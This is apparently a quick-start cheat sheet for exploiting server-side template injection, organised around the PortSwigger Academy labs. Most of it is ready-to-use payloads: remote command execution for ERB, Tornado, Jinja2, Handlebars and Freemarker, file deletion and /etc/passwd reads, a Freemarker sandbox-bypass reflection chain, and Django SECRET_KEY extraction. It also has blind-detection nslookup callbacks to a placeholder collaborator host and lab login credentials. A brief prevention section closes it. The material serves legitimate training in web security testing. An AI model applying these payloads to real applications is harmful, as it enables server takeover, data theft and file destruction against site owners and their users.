# Server-Side Template Injection (SSTI) - Quick Start Guide

**Fast-track guide for identifying and exploiting SSTI vulnerabilities**

---

## Quick Detection (30 seconds)

### Fuzzing Payload
```
${{<%[%'"}}%\
```

**What it does:** Triggers errors revealing template engine

### Mathematical Test
```
${7*7}    # Freemarker, Jinja2
{{7*7}}   # Tornado, Handlebars
<%= 7*7 %> # ERB
```

**Expected:** Output shows `49` = vulnerable

---

## Template Engine Identification

| Test Payload | Returns 49? | Engine | Language |
|--------------|-------------|---------|----------|
| `<%= 7*7 %>` | ✓ | ERB | Ruby |
| `{{7*7}}` | ✓ | Tornado/Jinja2 | Python |
| `${7*7}` | ✓ | Freemarker | Java |
| `{{7*7}}` | ✗ (shows "7*7") | Handlebars | Node.js |
| `{{7*7}}` | ✗ (shows "7*7") | Django | Python |

---

## Rapid Exploitation Payloads

### ERB (Ruby) - Lab 1
**Delete File:**
```ruby
<%= system("rm /home/carlos/morale.txt") %>
```

**Read File:**
```ruby
<%= File.read('/etc/passwd') %>
```

### Tornado (Python) - Lab 2
**Delete File (Breaking Out):**
```python
user.name}}{%import os%}{{os.system('rm /home/carlos/morale.txt')
```

**Context:** When input is inside `{{user.name}}`

### Handlebars (Node.js) - Lab 3
**RCE via require():**
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Freemarker (Java) - Lab 4
**RCE via Execute class:**
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("rm /home/carlos/morale.txt")}
```

**Documentation path:**
1. Test `${foobar}` → Error reveals Freemarker
2. Check FAQ → Find security warnings
3. Check "new()" built-in → TemplateModel requirement
4. Check JavaDoc → Find Execute class

### Django (Python) - Lab 5
**Information Disclosure:**
```django
{% debug %}
```

**Extract SECRET_KEY:**
```django
{{settings.SECRET_KEY}}
```

### Freemarker Sandboxed - Lab 7
**Read File via Reflection:**
```freemarker
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

**Output:** Decimal ASCII values (e.g., `109 121 112...`)

**Convert:** 109=m, 121=y, 112=p → `myp...`

---

## Lab Quick Reference

| # | Lab | Difficulty | Engine | Time | Key Technique |
|---|-----|-----------|--------|------|---------------|
| 1 | Basic SSTI | Apprentice | ERB | 2-3 min | Direct injection |
| 2 | Code Context | Practitioner | Tornado | 5-8 min | Break out with `}}` |
| 3 | Unknown Language | Practitioner | Handlebars | 10-15 min | Fingerprint + documented exploit |
| 4 | Using Documentation | Practitioner | Freemarker | 15-20 min | Research Execute class |
| 5 | Information Disclosure | Practitioner | Django | 8-12 min | `{% debug %}` + `settings.SECRET_KEY` |
| 6 | Custom Exploit | Expert | PHP | 30-45 min | Method chaining: `setAvatar()` + `gdprDelete()` |
| 7 | Sandboxed | Expert | Freemarker | 20-30 min | Reflection chain to bypass sandbox |

---

## Common Injection Points

### GET Parameters
```
/?message=PAYLOAD
/?template=PAYLOAD
/?name=PAYLOAD
```

### POST Parameters
```
blog-post-author-display=PAYLOAD
email_template=PAYLOAD
user_input=PAYLOAD
```

### Headers
```
User-Agent: PAYLOAD
X-Forwarded-For: PAYLOAD
```

### File Uploads
```
template.txt containing: PAYLOAD
```

---

## Breaking Out of Contexts

### Already Inside Expression
```python
# Template: {{user.name}}
# Payload: name}}{{7*7}}
# Result: {{user.name}}{{7*7}}
```

### String Literal
```python
# Template: {{"Hello " + input + "!"}}
# Payload: " + system("whoami") + "
```

### Attribute Value
```html
# Template: <div data-value="{{input}}">
# Payload: "}}<script>alert(1)</script>{{
```

---

## Burp Suite Quick Setup

### 1. Intercept Request
- Turn on Proxy intercept
- Submit form/request with injectable parameter

### 2. Send to Repeater
- Right-click → "Send to Repeater"

### 3. Test Payloads
- Replace parameter with SSTI payloads
- Click "Send"
- Check response for "49" or errors

### 4. Automate with Intruder
- Send to Intruder
- Mark parameter: `§parameter§`
- Add payloads: `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`
- Start attack

---

## Blind SSTI Detection

### DNS Callback (Burp Collaborator)
```ruby
# ERB
<%= `nslookup BURP-COLLABORATOR-SUBDOMAIN` %>

# Tornado
{% import os %}{{os.system('nslookup BURP-COLLABORATOR-SUBDOMAIN')}}

# Freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("nslookup BURP-COLLABORATOR-SUBDOMAIN")}
```

### Time-Based Detection
```ruby
# ERB
<%= sleep(10) %>

# Python
{% import time %}{{time.sleep(10)}}
```

---

## URL Encoding Quick Reference

| Character | URL Encoded |
|-----------|-------------|
| `<` | `%3C` |
| `>` | `%3E` |
| `%` | `%25` |
| `{` | `%7B` |
| `}` | `%7D` |
| `"` | `%22` |
| Space | `+` or `%20` |

---

## Template Syntax Cheat Sheet

### ERB (Ruby)
```erb
<%= code %>     # Execute and output
<% code %>      # Execute without output
<%# comment %>  # Comment
```

### Tornado/Jinja2 (Python)
```python
{{ expression }}     # Output
{% code %}          # Execute
{# comment #}       # Comment
```

### Freemarker (Java)
```freemarker
${expression}           # Output
<#assign var=value>    # Variable
<#if test>...</#if>    # Conditional
```

### Handlebars (JavaScript)
```handlebars
{{ expression }}              # Output
{{#helper}}...{{/helper}}    # Block helper
{{! comment }}               # Comment
```

### Django (Python)
```django
{{ variable }}        # Output
{% tag %}            # Execute tag
{{ var|filter }}     # Apply filter
```

---

## Common Mistakes

### 1. Forgetting URL Encoding
```
❌ /?message=<%= 7*7 %>
✓ /?message=%3C%25%3D+7*7+%25%3E
```

### 2. Not Breaking Out of Context
```
❌ {{system("whoami")}}
✓ name}}{{system("whoami")}}
```

### 3. Wrong Template Syntax
```
❌ Django: {{7*7}} expecting 49
✓ Django: Use {% debug %} or {{settings}}
```

### 4. Missing Method Parameters
```
❌ user.setAvatar('/etc/passwd')
✓ user.setAvatar('/etc/passwd','image/jpg')
```

---

## Lab-Specific Tips

### Lab 1 (Basic ERB)
- Test: `<%= 7*7 %>` → Should show 49
- Exploit: `<%= system("rm /home/carlos/morale.txt") %>`
- Done in 2 minutes!

### Lab 2 (Tornado Code Context)
- Login: `wiener:peter`
- Post a comment first
- Test: `user.name}}{{7*7` → Shows `Peter Wiener49}}`
- Break out: `user.name}}{%import os%}{{os.system('command')`

### Lab 3 (Handlebars)
- Fuzz: `${{<%[%'"}}%\` → Error reveals "Handlebars"
- Search online: "Handlebars SSTI exploit"
- Use documented exploit by @Zombiehelp54

### Lab 4 (Freemarker Documentation)
- Login: `content-manager:C0nt3ntM4n4g3r`
- Test: `${foobar}` → Error shows Freemarker
- Read docs → Find `new()` built-in
- Find Execute class in JavaDoc
- Exploit: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("command")}`

### Lab 5 (Django Info Disclosure)
- Login: `content-manager:C0nt3ntM4n4g3r`
- Use: `{% debug %}` to see available objects
- Find: `settings` object in context
- Extract: `{{settings.SECRET_KEY}}`
- Submit the key

### Lab 6 (Custom Exploit)
- Login: `wiener:peter`
- Upload invalid avatar → Error reveals `/home/carlos/User.php`
- Test: `user.setAvatar('/etc/passwd','image/jpg')`
- Read: GET `/avatar?avatar=wiener` → Returns /etc/passwd
- Read source: `user.setAvatar('/home/carlos/User.php','image/jpg')`
- Find: `gdprDelete()` method
- Chain: Set avatar to target → Call gdprDelete()

### Lab 7 (Sandboxed Freemarker)
- Login: `content-manager:C0nt3ntM4n4g3r`
- Direct Execute blocked by sandbox
- Use reflection chain: `${product.getClass()...}`
- Full payload reads file as byte array
- Output: Decimal ASCII values
- Convert: Use Python/online tool to decode

---

## Cheat Sheet: One-Liner Exploits

```bash
# ERB - File read
<%= File.read('/etc/passwd') %>

# ERB - RCE
<%= system("whoami") %>

# Tornado - RCE
{% import os %}{{os.system('whoami')}}

# Jinja2 - RCE
{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}

# Freemarker - RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}

# Django - Secret extraction
{{settings.SECRET_KEY}}

# Handlebars - RCE (short form, see full payload above)
{{#with "s" as |string|}}...require('child_process').exec('cmd')...{{/with}}
```

---

## ASCII Conversion (Lab 7)

**Decimal to Character:**
```
65-90  = A-Z
97-122 = a-z
48-57  = 0-9
32     = space
64     = @
```

**Python Converter:**
```python
ascii_values = [109, 121, 80, 64, 115, 115, 119, 48, 114, 100]
password = ''.join(chr(val) for val in ascii_values)
print(password)  # myP@ssw0rd
```

---

## Time Estimates by Lab

**Quick Labs (< 10 min):**
- Lab 1: 2-3 minutes
- Lab 2: 5-8 minutes
- Lab 5: 8-12 minutes

**Medium Labs (10-20 min):**
- Lab 3: 10-15 minutes
- Lab 4: 15-20 minutes
- Lab 7: 20-30 minutes

**Complex Lab (> 30 min):**
- Lab 6: 30-45 minutes (requires custom exploit development)

**Total for all 7 labs:** 90-120 minutes

---

## Red Flags in Applications

**High-Risk Features:**
- Custom email templates
- Report generators
- User-customizable views
- Content management systems
- Template editors
- Preview functions
- PDF generators

**Parameters to Test:**
- `template=`
- `view=`
- `page=`
- `format=`
- `message=`
- Any user-controlled text rendered server-side

---

## Methodology Summary

```
1. DETECT
   └─ Fuzz: ${{<%[%'"}}%\
   └─ Test: ${7*7}, {{7*7}}, <%= 7*7 %>

2. IDENTIFY
   └─ Analyze errors
   └─ Test engine-specific syntax
   └─ Check documentation

3. EXPLOIT
   └─ Research engine capabilities
   └─ Find dangerous functions
   └─ Construct payload
   └─ Break out of context if needed

4. VERIFY
   └─ Check objective achieved
   └─ Use Burp Collaborator for blind
   └─ Decode output if needed
```

---

## Prevention Quick Tips

**For Developers:**
1. Never concatenate user input into templates
2. Pass user data as parameters only
3. Use logic-less template engines (Mustache)
4. Enable sandboxing if user templates required
5. Disable dangerous built-ins (`new()`, `exec()`, etc.)

**For Pentesters:**
1. Always test for SSTI in template-like features
2. Don't rely on single payload - test multiple engines
3. Read documentation for obscure template engines
4. Check for blind SSTI with callbacks
5. Test both direct output and code contexts

---

## Resources

**Official Labs:**
- PortSwigger SSTI: https://portswigger.net/web-security/server-side-template-injection

**Payload Collections:**
- PayloadsAllTheThings SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- HackTricks SSTI: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

**Research Papers:**
- James Kettle: "Server-Side Template Injection: RCE for the modern webapp"

**Practice:**
- PortSwigger Academy (7 labs)
- HackTheBox machines with SSTI
- PentesterLab exercises

---

**Quick Start Complete! Now practice the labs to master SSTI exploitation.**
